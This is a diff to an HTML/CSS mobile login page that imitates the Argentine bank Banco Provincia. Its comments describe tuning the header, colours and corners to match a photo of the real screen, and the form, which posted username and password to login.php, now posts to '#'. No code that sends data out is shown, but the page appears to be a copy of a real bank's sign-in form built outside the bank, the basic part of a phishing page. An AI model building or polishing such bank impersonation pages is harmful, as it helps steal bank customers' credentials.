@@ -4,17 +4,18 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Banco Provincia</title>
-<!-- Iconos para el ojo -->
+<!-- Iconos -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
   :root {
     --verde-banco: #007a2b;
     --turquesa-banco: #2ebcb5;
     --texto-gris: #333333;
-    --placeholder-color: #999999;
+    --placeholder-color: #aaaaaa;
     --boton-color: #3c3c3c;
-    --boton-hover: #555555;
-    --radio-boton: 8px;
+    --borde-input: #dddddd;
+    --radio-boton: 4px; /* La foto muestra esquinas casi rectas */
+    --header-height: 110px;
   }
 
   * {
@@ -24,8 +25,8 @@
   }
 
   body {
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background-color: #f0f2f5; /* Fondo general suave */
+    font-family: 'Roboto', 'Segoe UI', sans-serif;
+    background-color: #e8ecf0;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -34,7 +35,7 @@
 
   .mobile-wrapper {
     width: 100%;
-    max-width: 420px; /* Ancho máximo similar a un móvil */
+    max-width: 400px;
     background-color: #ffffff;
     min-height: 100vh;
     display: flex;
@@ -43,7 +44,7 @@
     box-shadow: 0 0 20px rgba(0,0,0,0.1);
   }
 
-  @media (min-width: 421px) {
+  @media (min-width: 401px) {
     .mobile-wrapper {
       height: 95vh;
       border-radius: 12px;
@@ -53,37 +54,39 @@
     }
   }
 
-  /* HEADER CON DEGRADADO EXACTO */
+  /* HEADER EXACTO A LA IMAGEN */
   header {
-    background: linear-gradient(135deg, var(--verde-banco) 0%, var(--turquesa-banco) 100%);
-    padding: 20px 20px 15px 20px;
+    background: linear-gradient(90deg, var(--verde-banco) 0%, var(--turquesa-banco) 100%);
+    height: var(--header-height);
+    padding: 20px 20px 10px 20px;
     text-align: center;
     color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
   }
 
-  .header-content {
+  .logo-area {
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 15px;
+    gap: 12px;
+    margin-bottom: 15px;
   }
 
-  /* LOGO PNG */
-  .logo-img {
-    height: 45px; /* Altura ajustada para que se vea bien */
-    width: auto;
+  .logo-svg {
+    width: 36px;
+    height: 36px;
   }
 
   h1 {
-    font-size: 1.3rem;
+    font-size: 1.2rem;
     font-weight: 600;
-    letter-spacing: 0.5px;
   }
 
   .subtitulo {
     font-size: 1.1rem;
     font-weight: 600;
-    margin-top: 15px;
     opacity: 0.95;
   }
 
@@ -114,7 +117,7 @@
     padding: 12px 10px;
     font-size: 1rem;
     border: none;
-    border-bottom: 2px solid #dddddd;
+    border-bottom: 2px solid var(--borde-input);
     background: transparent;
     color: var(--texto-gris);
     outline: none;
@@ -133,7 +136,7 @@
   .toggle-pass-btn {
     position: absolute;
     right: 10px;
-    top: 38px; /* Ajuste vertical basado en label + padding */
+    top: 38px; 
     background: none;
     border: none;
     color: var(--verde-banco);
@@ -158,7 +161,7 @@
   }
 
   .btn-ingresar:hover {
-    background-color: var(--boton-hover);
+    background-color: #555555;
   }
 
   /* LINKS INFERIORES */
@@ -192,15 +195,19 @@
 
 <div class="mobile-wrapper">
   <header>
-    <div class="header-content">
-      <!-- IMAGEN LOGO GUARDADA COMO logo.png -->
-      <img src="logo.png" alt="Logo Banco" class="logo-img">
+    <div class="logo-area">
+      <!-- SVG Logo Banco Provincia -->
+      <svg class="logo-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L2 7V17L12 22L22 17V7L12 2Z" stroke="white" stroke-width="2"/>
+        <path d="M12 22V12" stroke="white" stroke-width="2"/>
+        <path d="M2 7L12 12L22 7" stroke="white" stroke-width="2"/>
+      </svg>
       <h1>Banco Provincia</h1>
     </div>
     <div class="subtitulo">Iniciá sesión</div>
   </header>
 
-  <form action="login.php" method="POST">
+  <form action="#" method="POST">
     
     <div class="input-group">
       <label for="usuario">Tu usuario <span class="required">*</span></label>
@@ -245,4 +252,3 @@
 
 </body>
 </html>
-
